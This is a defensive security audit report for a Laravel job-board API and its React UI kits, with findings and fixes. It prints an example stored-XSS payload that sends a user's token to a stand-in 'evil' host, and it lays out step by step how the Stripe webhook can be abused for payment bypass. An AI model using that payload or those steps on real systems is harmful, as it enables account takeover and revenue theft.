# PASS 2 — Security Audit (Krama)

**Auditor role:** Senior Application Security Engineer (offensive + defensive)
**Method:** STATIC review (read the real files; cannot run the app). Every finding cites a file + line range opened this run. Payment wire formats were **not** guessed — where a claim could not be confirmed from code it is marked `[UNVERIFIED]`.
**Stack confirmed this run:** Laravel 8.75 REST API, JWT auth (`php-open-source-saver/jwt-auth`, guard `api`), `spatie`-style role/permission model via custom `CheckPermission` middleware + controller-level `requirePermission()`, four in-browser React "UI kits" compiled by `@babel/standalone` at runtime and served as **static files by Apache/XAMPP (outside Laravel)**. Payments: KHQR/Bakong, ABA PayWay, Stripe. No Meilisearch, no Filament, no Inertia.

---

## Executive summary

**The API layer is genuinely well-built for security** — object-level authorization is enforced consistently (CV downloads, message threads, company edits, applicant pipeline all check ownership, not just role), CV files sit on a private disk with a per-candidate visibility gate, the public settings endpoint has a hard group allowlist that excludes every secret-bearing group, the settings writer has a secret-preserve safeguard, the Telegram webhook is timing-safe secret-verified, JWTs use a blacklist, `password_hash` is hidden, there is no mass-assignment, no hardcoded secret is committed to git, and all raw SQL uses bindings or static strings. That is a stronger baseline than most projects reach.

**The two launch-blocking problems are on the edges the API does not own:** (1) the four UI kits render employer- and candidate-supplied rich text through `dangerouslySetInnerHTML` with **no sanitization anywhere** and no CSP on the static pages — a classic stored XSS that reaches every public visitor *and* the admins who moderate content; and (2) the Stripe **webhook** has a fallback lookup path that fulfills a payment using a `session_id` that is never bound to that payment's amount or identity, enabling repeatable payment bypass. Both are remotely reachable by any self-registered user.

**Severity summary: 1 critical / 3 high / 3 medium / 3 low**

**Top risks, in order:**
1. **Stored XSS via unsanitized rich text** rendered with `dangerouslySetInnerHTML` (public + admin victims, no CSP on the affected pages). (CRITICAL)
2. **Privilege escalation** — a plain `admin` (holds `manage_users`, not `manage_roles`) can create a `super_admin` account via `adminCreateUser`, which accepts any role slug unrestricted. (HIGH, auth)
3. **Stripe webhook payment bypass** — fallback path fulfills a payment from an unrelated but genuinely-paid session; no amount/identity binding, no signature check. (HIGH, money)
4. **Hosting env template ships a concrete `JWT_SECRET`/`APP_KEY`** reused across local/testing → JWT forgery if copied verbatim to prod. (HIGH, auth)

---

## Coverage ledger

| Area | Files read this run | Verdict |
|---|---|---|
| Attack surface / routing | `routes/api.php` (full) | Well-segmented: public / `auth:api` / `permission:site_settings` / `permission:moderate_forum` tiers |
| AuthZ primitives | `app/Http/Middleware/CheckPermission.php`, `app/Http/Controllers/Controller.php` (`requirePermission`, `auditLog`) | Sound |
| Payment webhooks + verify | `PaymentController.php:235-456`, `app/Services/PaymentService.php:30-183` | **HIGH (Stripe fallback H2)**; ABA/Bakong safe |
| IDOR — CVs / applications | `ApplicationController.php` (full), `ResumeController.php` (upload/download) | Safe — ownership + `cv_visibility` + private disk |
| IDOR — messages | `MessageController.php:109-208` (`findConversation`) | Safe — membership enforced |
| IDOR — company | `CompanyController.php:105-160` (`update`/`ownCompany`) | Safe |
| Privilege escalation | `UserController.php` (full), `DatabaseSeeder.php:15-58` | **HIGH — admin can create super_admin (H1)**; edit path gated by `manage_roles` (M2) |
| Public settings / secret leak | `SettingController.php:16-260` (SCHEMA, `publicGroup`, `update`) | Safe — group allowlist excludes secrets; **LOW on `payment_config`** |
| LLM proxy | `ChatController.php` (full) | Key server-side; **MEDIUM — unauthenticated cost abuse** |
| Telegram webhook | `TelegramController.php:74-80` | Safe — timing-safe secret header check |
| Injection sweep | repo-wide grep `whereRaw`/`DB::raw`/`->all()` | Safe — bindings / static strings only |
| Secrets in repo | `git ls-files`, `.gitignore`, `.env.hosting.template` | Not committed; **HIGH on shared template secret (H3)** |
| Crypto config | `config/jwt.php`, `config/hashing.php` | JWT ok; **LOW — bcrypt rounds 10** |
| Transport / headers | `app/Http/Middleware/SecurityHeaders.php`, `config/cors.php` | Good API headers; CSP does **not** cover static UI pages |
| Stored-XSS sinks | `job-detail.jsx:31-38`, `company-detail.jsx:269`, `employer-dashboard/app.jsx:640` | **CRITICAL** |

---

## CRITICAL

### C1 — Stored XSS: employer/candidate rich text rendered unsanitized via `dangerouslySetInnerHTML`
**Where:**
- `krama/ui_kits/public-website/job-detail.jsx:31-38` — `RichContent`: `if (/<[a-z][\s\S]*>/i.test(html)) { return <div … dangerouslySetInnerHTML={{ __html: html }} /> }` — any value containing a tag is rendered **raw**.
- `krama/ui_kits/public-website/company-detail.jsx:269` — company "about"/`description` rendered raw the same way.
- `krama/ui_kits/employer-dashboard/app.jsx:640` — `Section` renders `text` raw via `dangerouslySetInnerHTML`.
- Write side has **no sanitization**: `JobController.php:119,163` validates `description` only as `nullable|string|max:20000`; `CompanyController.php:121` validates `description` as `nullable|string|max:10000`. No HTML sanitizer is installed at all — `composer.json` has no `mews/purifier` / `ezyang/htmlpurifier` / html-sanitizer package.

**Exploit:** A self-registered employer posts a job (or company profile) whose description contains an event-handler payload — e.g. `<img src=x onerror="fetch('https://evil/?c='+localStorage.getItem('krama_token'))">` or `<svg onload=…>`. `<script>` tags won't execute via `innerHTML`, but `onerror`/`onload`/`onfocus autofocus` handlers **do**. The public `job-detail` / `company-detail` pages then execute the attacker's JS in the browser of **every visitor**, including candidates and — critically — the **admin/moderator** who opens the job or company to approve it. If the JWT is held in `localStorage`/`sessionStorage` (the standard for these kits), the payload exfiltrates it → **full account takeover, including admin**.

**Why it is unmitigated:** The `SecurityHeaders` middleware CSP (`app/Http/Middleware/SecurityHeaders.php:23-26`, `script-src 'none'`) is applied only to **Laravel API responses**. The vulnerable pages are the static `index.html` UI kits served directly by Apache/XAMPP and are **not** behind that middleware — and they intentionally load React/Babel + inline scripts, so no strict CSP is in force there. There is no second layer.

**Remediation (defense in depth — do all three):**
1. **Sanitize on render**: run the HTML through DOMPurify before `dangerouslySetInnerHTML` in all three sinks (allowlist `b,i,em,strong,ul,ol,li,p,br,a[href]` etc., strip all event handlers and `script`/`svg`/`iframe`). This is the fastest fix and must ship before launch.
2. **Sanitize on write** in the API (`JobController`/`CompanyController`/wherever rich text is stored): add an HTML purifier and strip disallowed tags/attributes server-side so stored data is clean even for other clients.
3. **Add a CSP to the static pages** (Apache header or `<meta http-equiv>` — though pin scripts to specific hosts and drop inline where feasible) so a future sink can't be exploited.

---

## HIGH

### H1 — Privilege escalation: a plain `admin` can create a `super_admin` account
**Where:** `UserController.php:86-114` (`adminCreateUser`); seeder grants at `database/seeders/DatabaseSeeder.php:15-16,35,46-58`.

`adminCreateUser` is gated only on `requirePermission('manage_users')` (`:88`) and validates `'role' => 'required|string|exists:roles,slug'` (`:94`) with **no restriction on which role** — it then creates the user with that role verbatim (`:100-107`). The seeder gives the `admin` role `manage_users` but deliberately **withholds** `manage_roles` (`DatabaseSeeder.php:46-49` — `$adminPerms` lists `manage_users`, `suspend_users` etc. but not `manage_roles`; only `super_admin` gets every permission via the loop at `:54-56`). The intent is explicit in the seed data: `admin` = "Platform administration **except role management**" and `manage_roles` = "Assign roles to users (**super admin only**)" (`:16,35`).

The *edit* path is correctly gated — `adminUpdateUser` requires `manage_roles` (`:119`), so changing an existing user's role is super-admin-only (see M2). But the *create* path bypasses that boundary entirely: a plain admin `POST /api/admin/users {name, email, password, role:"super_admin"}` mints a brand-new super-admin whose password they choose, then logs in as full platform owner (which then also grants `manage_roles`, payments, plans, settings).

**Impact:** vertical privilege escalation from `admin` to `super_admin` by anyone already holding an admin account. Precondition is an admin login, so it is an insider/second-stage escalation rather than an anonymous one — but it collapses the entire admin/super-admin trust boundary the RBAC model is built on.

**Remediation:** in `adminCreateUser`, reject `role ∈ {super_admin, admin}` (any role carrying admin-area permissions) unless the caller holds `manage_roles`; or require `manage_roles` for the whole endpoint when the target role is privileged. Mirror the guard proposed in M2 (no assigning a role above your own).

### H2 — Stripe webhook fulfills payments with an unbound, reusable session id (payment bypass)
**Where:** `PaymentController.php:400-429` (`stripeWebhook`) + `PaymentService.php:167-182` (`stripeSessionPaid`).

The webhook is unauthenticated (correct on its own — Stripe posts here) and **re-verifies server-side**, which is the right pattern. The flaw is the *fallback* match + the fact that `stripeSessionPaid()` only asserts `payment_status === 'paid'` for a given session id and returns a bare boolean — it never checks the session's `amount_total`, `currency`, or `metadata[payment_id]`/`client_reference_id` against the payment being fulfilled:

```php
$payment = Payment::where('gateway_ref', $sessionId)->where('status','pending')->first(); // SAFE: session bound to payment
if (! $payment && $ref !== '') {
    $payment = Payment::where('invoice_no', $ref)->where('status','pending')->first();     // UNSAFE: $ref is attacker-controlled
}
…
if (PaymentService::stripeSessionPaid($sessionId, $key)) { PaymentService::fulfill($payment); }
```

**Exploit (repeatable revenue theft):**
1. Attacker (any employer) legitimately completes **one** cheap Stripe payment → obtains a real paid session id `cs_…` (visible in the checkout URL returned by `stripeCheckout`). That payment becomes `paid`.
2. Attacker creates an **expensive** pending payment (top-tier subscription / large CV-credit pack / featured boost) → invoice `I2`, never pays it.
3. Attacker POSTs to `/api/payments/stripe/webhook` with `data.object.id = cs_… (the paid one)` and `data.object.client_reference_id = I2`.
4. Primary lookup by `gateway_ref = cs_…` returns null (that payment is already `paid`), so the **fallback** selects the expensive pending payment by `invoice_no = I2`. `stripeSessionPaid(cs_…)` returns `true` → `fulfill()` activates the expensive plan.
5. The single paid session id can be **reused** against unlimited pending invoices.

Net: one genuine minimal payment → unlimited paid features. ABA (`abaCallback`, `PaymentController.php:339-361`) and Bakong are **not** affected — they verify the same `tran_id`/`md5` that identifies the payment, so identifier and verification are bound.

**Remediation:**
- Make `stripeSessionPaid()` return the session object and, before `fulfill()`, assert `session.client_reference_id === payment.invoice_no` **and** `session.amount_total === round(payment.amount*100)` **and** matching `currency` (and/or `metadata.payment_id === payment.id`).
- Drop the `client_reference_id` fallback, or only accept it when the above bindings all match.
- Add real **Stripe signature verification** (`Stripe-Signature` header vs the webhook signing secret) as the outer gate, mirroring the Telegram webhook's secret check.
- Keep card payments **disabled** in production until this is fixed.

### H3 — Hosting env template ships a concrete, shared `JWT_SECRET` / `APP_KEY`
**Where:** `krama-api/.env.hosting.template` (gitignored — **not** committed, confirmed via `git ls-files`), lines `APP_KEY=base64…`, `JWT_SECRET=rnFUci…`; Pass 4 confirmed the same values appear in `.env` and `.env.testing`.

The template carries a real-looking, working `JWT_SECRET` and `APP_KEY` that are identical across local/testing/template. Deploy docs are copy-the-template style. If an operator copies it to production without regenerating, the JWT signing key is **known** (anyone with the template — every developer, the working tree, any leaked copy) and predictable, enabling **arbitrary JWT forgery → full authentication bypass** for any user/role. `config/jwt.php:18,125` uses `HS256` with `env('JWT_SECRET')`, so the whole auth model rests on this value's secrecy.

**Remediation:** Ship the template with `JWT_SECRET=` and `APP_KEY=` **empty** and a bold instruction to run `php artisan key:generate` and `php artisan jwt:secret` on the server. Rotate the exposed values everywhere they were used. Add a boot-time guard that refuses to run in `APP_ENV=production` if the secret matches the template's default.

---

## MEDIUM

### M1 — Unauthenticated LLM chat proxy → cost abuse / free general-purpose model
**Where:** `routes/api.php:70` (`POST /api/chat`, public, `throttle:20,1`) + `ChatController.php:14-102`.

The API key correctly stays server-side (good). But the endpoint is **unauthenticated** and the only limit is `throttle:20,1` **per IP**. A distributed client can drive effectively unbounded paid Anthropic completions (billed to the operator), and the "Krama assistant" system prompt is a soft guardrail — a determined user can prompt past it and use it as a free general LLM. `max_tokens` is capped at 1024 (good), but there is no per-day/global spend cap.

**Remediation:** Require authentication (or a signed widget token), add a **global daily token/spend budget** that fails closed, tighten the per-IP throttle, and log usage for anomaly detection.

### M2 — Role *edit* path has no privilege-boundary guard (companion to H1)
**Where:** `UserController.php:117-147` (`adminUpdateUser`), gated by `permission:site_settings` (route) + `requirePermission('manage_roles')` (controller).

Unlike the *create* path (H1), the edit path **is** correctly restricted to `manage_roles` (super-admin-only per the seeder), input is validated, and there is no mass-assignment — so this is the lesser issue. The residual gap: a `manage_roles` holder can still assign **any** role including `super_admin` to **anyone including themselves**, and can demote/suspend the last remaining super-admin (lockout). There is no code-level guard preventing self-role-change or last-super-admin removal.

**Remediation:** Forbid assigning a role with privileges exceeding the actor's; block changing your own role; refuse to remove the last active `super_admin`. Audit-log already records the change (`user.updated`) — good.

### M3 — `payment_config` group is served publicly in full
**Where:** `SettingController.php:138` — `publicGroup` allowlist includes `payment_config`, whose schema (`:57-59`) is a free-form `data` JSON blob up to **500 KB** rendered verbatim to anonymous callers.

Today it holds only the KHQR merchant account id (genuinely public — it is embedded in the QR), so **no secret leaks currently**. But the endpoint dumps the entire blob with no per-key filtering, so any secret an admin ever places in `payment_config` (a mistaken paste of an API key, a gateway credential) would be publicly exposed and cached for an hour.

**Remediation:** Define an explicit key allowlist for `payment_config` inside `publicGroup` (mirror the `chat` group's `$sensitive` strip), or split public merchant metadata into its own group and keep `payment_config` admin-only.

---

## LOW

### L1 — bcrypt cost factor is 10
`config/hashing.php:32` — `'rounds' => env('BCRYPT_ROUNDS', 10)`. Acceptable but on the low side for 2026 hardware. Set `BCRYPT_ROUNDS=12` in production.

### L2 — CORS origins default to `http://localhost`
`config/cors.php:22` derives `allowed_origins` from `CORS_ALLOWED_ORIGINS` (default `http://localhost`). Fail-closed and `supports_credentials=false` (good — no credentialed cross-origin exposure), but the env var **must** be set to the real frontend origin(s) in production or the API will reject the live site. Operational, not exploitable.

### L3 — Unauthenticated payment webhooks can trigger outbound gateway calls
`PaymentController.php:400,339` — anyone can POST to the Stripe/ABA webhooks with an arbitrary session/tran id, causing an outbound verification request to the gateway (API-quota consumption / minor DoS). Throttled at 120/min and 60/min respectively, so impact is limited. Adding signature verification (see H2) closes this too.

---

## Strong controls confirmed this run (do not regress)

- **Object-level authorization is enforced, not assumed.** CV download verifies the employer owns the job *and* honours `cv_visibility` (`ApplicationController.php:322-361`); message endpoints enforce thread membership (`MessageController.php:198-207`); company edits scope to `ownCompany()` (`CompanyController.php:111`); applicant pipeline and stage updates use `whereHas('job.company', user_id)` (`:153-213`).
- **CV files are private.** Uploads validated `mimes:pdf,doc,docx|max:5120` and stored on the `local` (non-public) disk (`ResumeController.php:92,109`); downloads stream through the ownership-checked controller, not a public URL.
- **Public settings endpoint cannot leak secrets.** Hard group allowlist (`SettingController.php:138`) excludes `payment`, `telegram`, `smtp`, `sms`, `cv_match`, `social_post`; the `chat` group strips `apiKey`/`endpoint`/`system_prompt`. The settings writer never overwrites a stored secret with an empty submit (`:125-132` preserve-list).
- **Telegram webhook is authenticated** with a timing-safe `hash_equals` check of `X-Telegram-Bot-Api-Secret-Token` (`TelegramController.php:80`); the secret is auto-generated with `random_bytes` (`SettingController.php:327`).
- **ABA/Bakong payment verification binds identifier to verification** and re-checks server-side; ABA request is HMAC-SHA512 signed (`PaymentService.php:89-119`).
- **No mass-assignment, no injection, no committed secrets.** All `create/update` use validated arrays; raw SQL uses PDO bindings or static strings (`RecommendationController.php:87-90` builds the score expression with `?` bindings); `git ls-files` tracks only `.env.example`; `password_hash` + `telegram_link_token` are in the model `$hidden`.
- **Auth hardening basics present.** `throttle:auth` (5/min) on login, register, OTP, refresh, password forgot/reset (`routes/api.php:31-39`); JWT blacklist enabled (`config/jwt.php:211`); 60-min access TTL, 14-day refresh.
- **Sensible API security headers** (`SecurityHeaders.php`) — `nosniff`, `X-Frame-Options: DENY`, referrer policy, a real CSP on API responses. (Note: extend CSP coverage to the static UI pages — see C1.)

---

## Go-live verdict (security pass)

**Conditional — not ready to launch as-is.** Four issues must be fixed first:
- **C1 (stored XSS)** — sanitize the three `dangerouslySetInnerHTML` sinks (DOMPurify) *and* on write; add a CSP to the static pages. **Blocker.**
- **H1 (admin→super_admin escalation)** — restrict privileged target roles in `adminCreateUser` to `manage_roles` holders. **Blocker** (a few lines).
- **H2 (Stripe payment bypass)** — bind session→payment by amount+identity, add signature verification, keep card payments off until fixed. **Blocker for card payments.**
- **H3 (shared JWT secret)** — blank the template secrets and regenerate on the server; add a production guard. **Blocker.**

The medium/low items (LLM-proxy budget cap, role-edit-boundary guard, bcrypt cost, CORS env, `payment_config` filtering) should be scheduled but do not individually block launch. The underlying API authorization model is solid and does not require rework — the escalation is a single missing guard, not a design flaw.
